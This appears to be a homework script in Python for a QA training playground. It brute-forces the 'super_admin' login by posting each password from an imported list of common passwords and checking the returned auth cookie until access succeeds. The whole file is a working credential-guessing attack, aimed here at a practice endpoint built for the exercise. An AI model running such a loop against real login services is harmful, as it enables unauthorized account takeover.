import requests
from hw_2_5_passwords_by_year import unique_passwords

login = "super_admin"
url_auth = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"


for password in unique_passwords:
    payload = {"login": login, "password": password}
    response_auth = requests.post(url_auth, data=payload)

    auth_cookie = response_auth.cookies.get("auth_cookie")

    if auth_cookie:
        cookies = {"auth_cookie": auth_cookie}
        response_check = requests.get(url_check, cookies=cookies)
        print(f"🔍 Server response: {response_check.text}")

        if response_check.text != "You are NOT authorized":
            print(f"Correct password found: {password}")
            print(f"Server response: {response_check.text}")
            break
else:
    print("Correct password has not been found")
